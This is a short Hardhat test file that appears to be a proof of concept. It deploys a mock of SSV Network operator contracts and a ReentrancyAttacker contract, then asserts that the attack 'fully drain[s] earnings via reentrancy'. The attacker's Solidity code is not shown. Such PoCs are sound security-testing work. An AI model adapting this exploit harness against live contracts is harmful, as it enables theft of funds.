const { ethers } = require("hardhat");
const { expect } = require("chai");

describe("SSV Reentrancy Mock PoC", function () {
  let mock, attacker, deployer;

  beforeEach(async function () {
    [deployer, attackerSigner] = await ethers.getSigners();

    const SSVMock = await ethers.getContractFactory("SSVOperatorsMock");
    mock = await SSVMock.deploy({ value: ethers.utils.parseEther("5") });
    await mock.deployed();

    const ReentrancyAttacker = await ethers.getContractFactory("ReentrancyAttacker");
    attacker = await ReentrancyAttacker.connect(attackerSigner).deploy(
      mock.address,
      5,
      1,
      { value: ethers.utils.parseEther("0.01") }
    );
    await attacker.deployed();
  });

  it("should fully drain earnings via reentrancy", async function () {
    const before = await ethers.provider.getBalance(attacker.address);
    console.log("Before attack attacker balance:", ethers.utils.formatEther(before));

    const tx = await attacker.attack({ value: ethers.utils.parseEther("0.01") });
    await tx.wait();

    const after = await ethers.provider.getBalance(attacker.address);
    console.log("After attack attacker balance:", ethers.utils.formatEther(after));

    expect(after).to.be.gt(before);
  });
});
